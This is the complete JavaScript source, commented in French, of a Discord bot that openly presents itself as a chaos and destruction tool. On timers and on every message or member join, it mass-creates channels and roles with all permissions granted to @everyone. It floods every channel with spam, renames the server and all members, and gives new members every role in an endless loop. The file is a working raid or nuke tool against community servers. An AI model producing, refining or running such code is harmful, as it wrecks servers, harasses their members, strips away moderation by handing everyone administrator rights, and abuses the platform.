const { Client, GatewayIntentBits, PermissionsBitField, Colors } = require('discord.js');
require('dotenv').config({ path: './config.env' });

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildPresences,
        GatewayIntentBits.GuildVoiceStates
    ]
});

// Configuration du bot ULTRA CHAOTIQUE
const TOKEN = process.env.TOKEN;
const CHANNEL_NAMES = ['chaos', 'destruction', 'anomie', 'désordre', 'panique', 'confusion', 'apocalypse', 'enfer', 'délire', 'folie', 
    'démence', 'catastrophe', 'cataclysme', 'tourmente', 'tempête', 'tsunami', 'ouragan', 'tornade', 'volcan', 'météorite',
    'extinction', 'armageddon', 'ragnarok', 'pandémonium', 'abîme', 'néant', 'vortex', 'maelström', 'cauchemar', 'terreur',
    'DESTRUCTION', 'CHAOS', 'ANOMIE', 'DÉSORDRE', 'PANIQUE', 'CONFUSION', 'APOCALYPSE', 'ENFER', 'DÉLIRE', 'FOLIE',
    'DÉMENCE', 'CATASTROPHE', 'CATACLYSME', 'TOURMENTE', 'TEMPÊTE', 'TSUNAMI', 'OURAGAN', 'TORNADE', 'VOLCAN', 'MÉTÉORITE'];

const ROLE_NAMES = ['Destructeur', 'Chaotique', 'Anomique', 'Perturbateur', 'Dévastateur', 'FouFurieux', 'DémonDuChaos', 'Psychopathe',
    'Démoniaque', 'Infernal', 'Apocalyptique', 'Cataclysmique', 'Tourmenteur', 'Ravageur', 'Annihilateur', 'Exterminateur',
    'ChaosSuprême', 'SeigneurDuDésordre', 'MaîtreDeLaFolie', 'DestructeurUltime',
    'DESTRUCTEUR-SUPREME', 'AGENT-DU-CHAOS', 'MAITRE-DE-LANOMIE', 'AVATAR-DU-DESORDRE', 'EMPEREUR-DE-LA-FOLIE',
    'DIEU-DU-CHAOS', 'PRINCE-DE-LA-DESTRUCTION', 'ROI-DE-LA-PANIQUE', 'SUPREME-DEVASTATEUR', 'CHAOS-INCARNÉ'];

const EMOJI_SPAM = ['💥', '🌪️', '🔥', '💀', '👻', '🤡', '👺', '🎭', '😈', '🚀', '☠️', '⚡', '🌋', '🌊', '🎪', '🃏', '🎭', '👾', '🤖', '🦹',
    '😱', '🙀', '👿', '🔪', '⛓️', '🗡️', '💣', '🧟', '🦾', '🎃', '👹', '🌑', '🌩️', '🌪️', '🌫️', '🔥', '💥', '⚡', '☄️', '🌋'];

const CRAZY_MESSAGES = [
    'BOUM BOUM BOUM! 💥💥💥',
    'AHAHAHAHA! LA DESTRUCTION EST BELLE! 🔥',
    'TOUT DOIT DISPARAÎTRE! ☠️',
    'LA FOLIE NOUS CONSUME! 🤪',
    'CHAOS! ANOMIE! DESTRUCTION! 🌪️',
    'MWAHAHAHA! C\'EST L\'HEURE DU CHAOS! 😈',
    'PLUS DE RÈGLES! PLUS D\'ORDRE! SEULEMENT LE CHAOS! 🎭',
    'LA FIN EST PROCHE! RÉJOUISSEZ-VOUS! ⚡',
    'QUE LE CHAOS RÈGNE! 👑',
    'BIENVENUE DANS LA FOLIE! 🃏',
    'DESTRUCTION TOTALE IMMINENTE!!! 💣',
    'L\'ANOMIE EST NOTRE RELIGION!!! 🙏',
    'PLUS RIEN NE SERA JAMAIS PAREIL!!! 🌋',
    'LE CHAOS EST LA SEULE VÉRITÉ!!! ⚡',
    'NOUS SOMMES LES AGENTS DU DÉSORDRE!!! 🦹',
    'QUE L\'APOCALYPSE COMMENCE!!! ☠️',
    'DÉTRUISEZ TOUT SUR VOTRE PASSAGE!!! 🔥',
    'L\'ORDRE DOIT ÊTRE ANÉANTI!!! 💥',
    'CHAOS! CHAOS! CHAOS! CHAOS! CHAOS! 🌪️',
    'ANOMIE FOREVER!!! 😈'
];

const SERVEUR_NAMES = [
    'Royaume du Chaos Absolu', 'Zone de Destruction Totale', 'Enfer sur Terre 2.0', 'Asile de Fous Suprême', 
    'Dimension de la Folie', 'Paradis de l\'Anomie', 'Arène du Désordre', 'Temple de la Destruction',
    'Sanctuaire de la Démence', 'Nexus du Chaos'
];

const random = arr => arr[Math.floor(Math.random() * arr.length)];

// Fonction pour générer des permissions TOTALEMENT folles
function getRandomPermissions() {
    return new PermissionsBitField(PermissionsBitField.All);  // TOUTES LES PERMISSIONS!!!
}

// Création de salons ultra chaotiques
async function createChaoticChannels(guild) {
    const numberOfChannels = Math.floor(Math.random() * 50) + 30; // 30-80 channels!!!
    for (let i = 0; i < numberOfChannels; i++) {
        const channelName = `${random(CHANNEL_NAMES)}-${random(EMOJI_SPAM)}-${random(EMOJI_SPAM)}-${Math.floor(Math.random() * 999999)}`;
        try {
            const channel = await guild.channels.create({
                name: channelName,
                permissionOverwrites: [
                    {
                        id: guild.id,
                        allow: getRandomPermissions()
                    }
                ]
            });
            
            // SPAM INTENSIF MAXIMUM
            const spamCount = Math.floor(Math.random() * 20) + 10; // 10-30 messages!!!
            for (let j = 0; j < spamCount; j++) {
                const emojiCount = Math.floor(Math.random() * 5) + 3; // 3-8 emojis
                const spamMessage = `${random(EMOJI_SPAM).repeat(emojiCount)} ${random(CRAZY_MESSAGES)} ${random(EMOJI_SPAM).repeat(emojiCount)} ${random(['!!!', '?!?!', '!?!?', '....', '!!!!!!!'])}`;
                channel.send(spamMessage);
                
                // 50% chance de spam multiple
                if (Math.random() < 0.5) {
                    for (let k = 0; k < 3; k++) {
                        channel.send(random(EMOJI_SPAM).repeat(10));
                    }
                }
            }
        } catch (error) {
            console.error('Erreur lors de la création du salon:', error);
        }
    }
}

// Création de rôles ultra chaotiques
async function createChaoticRoles(guild) {
    const numberOfRoles = Math.floor(Math.random() * 50) + 30; // 30-80 rôles!!!
    for (let i = 0; i < numberOfRoles; i++) {
        const roleName = `${random(ROLE_NAMES)}-${random(EMOJI_SPAM)}-${random(EMOJI_SPAM)}-${Math.floor(Math.random() * 999999)}`;
        try {
            await guild.roles.create({
                name: roleName,
                color: `#${Math.floor(Math.random()*16777215).toString(16)}`,
                permissions: getRandomPermissions(),
                hoist: true,
                mentionable: true,
                position: Math.floor(Math.random() * 100) // Position aléatoire
            });
        } catch (error) {
            console.error('Erreur lors de la création du rôle:', error);
        }
    }
}

// Fonction pour changer les noms de TOUT LE MONDE de manière ENCORE PLUS FOLLE
async function randomizeNicknames(guild) {
    const members = await guild.members.fetch();
    members.forEach(member => {
        if (!member.user.bot) {
            try {
                const prefix = random(['🤪', '👻', '💀', '👽', '🤡', '👺', '🎭', '😈', '🦹', '🃏', '💥', '🔥', '⚡', '☠️', '👾']);
                const middle = random(['Fou', 'Dément', 'Chaotique', 'Destructeur', 'Anomique', 'Psychopathe', 'Dérangé', 'Possédé']);
                const suffix = random(['DuChaos', 'DeLaFolie', 'DeLaDestruction', 'DeLAnomie', 'DuDésordre', 'DeLApocalypse', 'DuNéant', 'DeLEnfer']);
                const number = Math.floor(Math.random() * 999999);
                const extraEmoji = random(EMOJI_SPAM);
                member.setNickname(`${prefix} ${middle}-${number}-${suffix} ${extraEmoji}`)
                    .catch(console.error);
            } catch (error) {
                console.error('Erreur lors du changement de pseudo:', error);
            }
        }
    });
}

// Événement quand le bot est prêt
client.once('ready', () => {
    console.log(`BOT DE CHAOS ULTIME CONNECTÉ! PRÉPAREZ-VOUS AU DÉSORDRE TOTAL!`);
    
    // Change le statut du bot toutes les 5 secondes!!!
    setInterval(() => {
        const statuses = [
            'DESTRUCTION EN COURS!!!', 
            'CHAOS TOTAL!!!', 
            'PANIQUE GÉNÉRALE!!!', 
            'DÉLIRE MAXIMAL!!!',
            'ANOMIE SUPRÊME!!!',
            'DESTRUCTION COSMIQUE!!!',
            'FOLIE ABSOLUE!!!',
            'CHAOS INTERDIMENSIONNEL!!!'
        ];
        client.user.setActivity(random(statuses), { type: 'PLAYING' });
    }, 5000);
});

// Toutes les 5 secondes, fait quelque chose de TOTALEMENT FOU
setInterval(async () => {
    try {
        client.guilds.cache.forEach(async guild => {
            // TOUT FAIRE EN MÊME TEMPS !!!
            createChaoticChannels(guild);
            createChaoticRoles(guild);
            randomizeNicknames(guild);
            
            // Change le nom du serveur avec PLUS d'emojis
            const serverEmojis = Array(20).fill().map(() => random(EMOJI_SPAM)).join('');
            guild.setName(`${random(SERVEUR_NAMES)} ${serverEmojis}`).catch(console.error);

            // SPAM DANS TOUS LES SALONS EN MÊME TEMPS!!!
            const channels = guild.channels.cache.filter(ch => ch.type === 0);
            channels.forEach(channel => {
                for (let i = 0; i < 10; i++) { // 10 messages par salon
                    const emojiPrefix = random(EMOJI_SPAM).repeat(Math.floor(Math.random() * 10) + 5);
                    const emojiSuffix = random(EMOJI_SPAM).repeat(Math.floor(Math.random() * 10) + 5);
                    channel.send(`${emojiPrefix} ${random(CRAZY_MESSAGES)} ${emojiSuffix}`).catch(console.error);
                }
            });
        });
    } catch (error) {
        console.error('Erreur lors de l\'action chaotique périodique:', error);
    }
}, 5000); // Toutes les 5 secondes!!!

// Boucle infinie de spam dans les nouveaux messages
client.on('messageCreate', async message => {
    if (!message.author.bot) {
        try {
            // Ajoute PLEIN de réactions
            const reactionCount = Math.floor(Math.random() * 20) + 15; // 15-35 réactions!!!
            for (let i = 0; i < reactionCount; i++) {
                await message.react(random(EMOJI_SPAM));
            }
            
            // 100% de chance de répondre avec PLEIN de messages chaotiques!!!
            const spamCount = Math.floor(Math.random() * 8) + 5; // 5-13 messages de réponse!!!
            for (let i = 0; i < spamCount; i++) {
                const emojiPrefix = random(EMOJI_SPAM).repeat(Math.floor(Math.random() * 10) + 5);
                const emojiSuffix = random(EMOJI_SPAM).repeat(Math.floor(Math.random() * 10) + 5);
                message.channel.send(`${emojiPrefix} ${random(CRAZY_MESSAGES)} ${emojiSuffix}`);
            }

            // 50% de chance de déclencher une vague de chaos supplémentaire
            if (Math.random() < 0.5) {
                createChaoticChannels(message.guild);
                createChaoticRoles(message.guild);
                randomizeNicknames(message.guild);
            }
        } catch (error) {
            console.error('Erreur lors de la réaction aux messages:', error);
        }
    }
});

// Boucle infinie de chaos quand un membre rejoint
client.on('guildMemberAdd', async member => {
    try {
        // Boucle infinie de changements
        setInterval(async () => {
            // Change le nom du serveur
            const serverEmojis = Array(20).fill().map(() => random(EMOJI_SPAM)).join('');
            await member.guild.setName(`${random(SERVEUR_NAMES)} ${serverEmojis}`);
            
            // Attribution de TOUS les rôles possibles
            const roles = member.guild.roles.cache.filter(role => role.name !== '@everyone');
            roles.forEach(async role => {
                try {
                    await member.roles.add(role);
                } catch (error) {
                    console.error('Erreur lors de l\'attribution du rôle:', error);
                }
            });

            // SPAM DE MESSAGES DE BIENVENUE SANS FIN
            const welcomeMessages = [
                `🌪️ ALERTE MAXIMALE! ${member.user.username} VA TOUT RASER!!!`,
                `💥 ATTENTION! ${member.user.username} EST UN AGENT DU CHAOS!!!`,
                `🎭 FUYEZ! ${member.user.username} APPORTE L'ANOMIE TOTALE!!!`,
                `👻 ${member.user.username} EST LÀ POUR DÉTRUIRE L'ORDRE!!!`,
                `🔥 TREMBLEZ! ${member.user.username} EST PARMI NOUS!!!`
            ];

            // Spam dans TOUS les salons
            const channels = member.guild.channels.cache.filter(ch => ch.type === 0);
            channels.forEach(channel => {
                for (let i = 0; i < 15; i++) {  // 15 messages par salon!
                    const spamMessage = `${random(EMOJI_SPAM).repeat(10)} ${random(welcomeMessages)} ${random(EMOJI_SPAM).repeat(10)}`;
                    channel.send(spamMessage).catch(console.error);
                }
            });

            // CHAOS TOTAL EN CONTINU
            createChaoticChannels(member.guild);
            createChaoticRoles(member.guild);
            randomizeNicknames(member.guild);
            
        }, 3000); // Toutes les 3 secondes!!!
        
    } catch (error) {
        console.error('Erreur lors de l\'accueil d\'un nouveau membre:', error);
    }
});

client.login(TOKEN);
